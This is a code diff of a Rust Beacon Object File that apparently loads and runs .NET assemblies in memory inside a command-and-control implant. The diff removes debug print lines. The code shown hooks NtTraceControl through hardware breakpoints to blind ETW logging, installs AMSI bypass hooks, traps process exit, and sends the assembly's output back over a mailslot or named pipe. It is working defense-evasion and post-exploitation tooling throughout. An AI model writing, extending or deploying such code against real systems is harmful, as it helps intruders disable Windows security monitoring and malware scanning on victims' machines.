@@ -35,7 +35,6 @@ fn main(args: *mut u8, len: usize) {
 fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
     use error::BofError;
     let a = args::parse(raw_args, len).map_err(BofError::Args)?;
-    rustbof::eprintln!("[dbg] args parsed");
     unsafe {
         let asm_info = pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
             pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
@@ -43,10 +42,8 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             pe_parser::Error::TargetFrameworkUnknown => BofError::TargetFrameworkUnknown,
             other => BofError::PeParse(other),
         })?;
-        rustbof::eprintln!("[dbg] pe parsed ok");
 
         let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
-        rustbof::eprintln!("[dbg] hwbp engine init ok");
         let _etw = if a.etw {
             let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
             let exp_h = opsec_strcrypt::hash!("NtTraceControl");
@@ -56,7 +53,6 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
                     module_hash: ntdll_h,
                     export_hash: exp_h,
                 })?;
-            rustbof::eprintln!("[dbg] etw hook installed");
             Some(
                 engine
                     .install_rip_ret(target as usize, 0)
@@ -67,10 +63,8 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
         };
 
         let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
-        rustbof::eprintln!("[dbg] io channel open");
 
         let _amsi = if a.amsi {
-            rustbof::eprintln!("[dbg] installing amsi hooks");
             Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
         } else {
             None
@@ -93,17 +87,13 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             let _exit_trap = engine
                 .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                 .map_err(BofError::Hwbp)?;
-            rustbof::eprintln!("[dbg] exit-trap installed, dispatching...");
 
             clr::dispatch(
                 &asm_info, &a.asm_bytes,
                 &a.app_domain, &a.asm_args, a.entry_point,
             )?;
-            rustbof::eprintln!("[dbg] dispatch returned");
             let output = io_ch.drain()?;
             rustbof::eprintln!("\n{}", output);
-        } else {
-            rustbof::eprintln!("[dbg] exit-trap fired, skipping to cleanup");
         }
         let _ = invoked;
     }
